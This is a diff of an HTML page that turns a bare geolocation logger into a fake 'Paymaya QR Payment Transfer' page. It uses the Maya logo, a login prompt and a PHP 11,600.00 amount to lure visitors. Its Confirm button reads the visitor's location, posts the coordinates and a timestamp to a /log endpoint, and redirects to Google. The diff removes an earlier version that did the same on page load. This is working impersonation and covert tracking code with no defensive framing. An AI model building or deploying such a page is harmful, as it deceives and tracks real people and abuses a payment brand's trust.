@@ -1,26 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Loading...</title>
+  <meta charset="UTF-8">
+  <title>Paymaya QR Payment Transfer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #333;
+    }
+
+    .container {
+      text-align: center;
+      max-width: 360px;
+      width: 90%;
+      padding: 20px;
+    }
+
+    .logo {
+      width: 100px;
+      margin: 0 auto 20px;
+    }
+
+    .confirm-button {
+      background-color: #00C853;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 24px;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    .qr-box {
+      border: 1px solid #e0e0e0;
+      border-radius: 12px;
+      padding: 20px;
+      display: inline-block;
+      width: 100%;
+      max-width: 320px;
+      background: #fafafa;
+    }
+
+    .qr-image {
+      width: 100%;
+      max-width: 240px;
+      height: auto;
+      margin-bottom: 12px;
+      border-radius: 12px;
+    }
+
+    .amount {
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .note {
+      font-size: 12px;
+      color: #555;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+
+    .note a {
+      color: #2e7d32;
+      text-decoration: none;
+    }
+
+    @media (max-width: 480px) {
+      .confirm-button {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+
+      .amount {
+        font-size: 15px;
+      }
+
+      .note {
+        font-size: 11px;
+      }
+    }
+  </style>
 </head>
 <body>
-<script>
-navigator.geolocation.getCurrentPosition(position => {
-  fetch('/log', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      lat: position.coords.latitude,
-      lng: position.coords.longitude,
-      time: new Date().toISOString()
-    })
-  }).finally(() => {
-    window.location.href = 'https://www.google.com';
-  });
-}, () => {
-  window.location.href = 'https://www.google.com';
-});
-</script>
-<p>Loading...</p>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Maya_Logo_2022.svg" alt="maya logo" class="logo">
+    <p>Use your Maya account to login</p>
+    <button class="confirm-button" onclick="getLocation()">Confirm</button>
+
+    <p><strong>Or Scan <span style="color:#6200ee;">₱QRPh</span> QR to Pay</strong><br>
+    Use your Bank or e-Wallet’s App to scan QR code</p>
+
+    <div class="qr-box">
+      <img src="qr-placeholder.png" alt="QR Code" class="qr-image">
+      <div class="amount">PHP 11,600.00</div>
+    </div>
+
+    <p class="note">
+      <strong>Note:</strong> This QR code is powered by QRPh which can<br>
+      also be scanned by partner <a href="#">Banks and e-Wallets</a>.
+    </p>
+  </div>
+
+  <script>
+    function getLocation() {
+      navigator.geolocation.getCurrentPosition(position => {
+        fetch('/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            time: new Date().toISOString()
+          })
+        }).finally(() => {
+          window.location.href = 'https://www.google.com';
+        });
+      }, () => {
+        window.location.href = 'https://www.google.com';
+      });
+    }
+  </script>
 </body>
 </html>
